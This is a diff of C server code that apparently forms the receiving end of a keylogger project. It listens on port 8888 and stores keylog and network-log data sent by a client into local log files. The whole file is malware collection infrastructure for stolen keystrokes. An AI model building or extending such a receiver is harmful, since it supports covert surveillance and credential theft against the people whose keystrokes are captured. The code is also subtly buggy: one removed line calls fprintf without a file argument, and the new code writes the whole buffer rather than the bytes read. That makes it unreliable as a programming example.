@@ -1,16 +1,14 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>      
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <unistd.h>
 
-int main(int argc , char *argv[])
+#include "server_client.h"
+
+void run_server(void)
 {
     // Variables
     int ssock, csock, addrlen, read_size, ret;
     struct sockaddr_in server, client;
-    char message[3000];
+    char rec_buffer[2000];
     
     short port = 8888;
     
@@ -52,30 +50,32 @@ int main(int argc , char *argv[])
     }
     printf("Connection accepted\n");
     
-    memset(message, 0, sizeof(message));  //clear message array
+    /*** Reading from Client and writing to local files* ***/
     
+    memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
     /*Open keylog files for printing*/
-    FILE *keylog_file = fopen("log/keylog_received.txt", "a");
+    FILE *keylog_log = fopen("log/keylog_received.txt", "a");
     /*Receive a keylog file from the client*/
-    if ((read_size = read(csock, message, sizeof(message))) > 0) {
-        fprintf("%s\n", message);
+    if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
+        fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), keylog_log);
     } else {
         perror("Error receiving keylog log\n");
     }
-    fclose(keylog_file);
+    fclose(keylog_log);
     
-    memset(message, 0, sizeof(message));  //clear message array
+    
+    memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
     /*Open network log file for printing*/
     FILE *network_log = fopen("log/network_received.txt", "a");
     /*Receive network log file*/
-    if ((read_size = read(csock, message, sizeof(message))) > 0) {
-        fprintf(network_log,"%s\n", message);
+    if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
+        fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), network_log);
     } else {
         perror("Error receiving network log\n");
     }
     fclose(network_log);
     
-    memset(message, 0, sizeof(message));
+    memset(rec_buffer, 0, sizeof(rec_buffer));
     printf("\nLog transfer complete\n");
     
     close(csock);
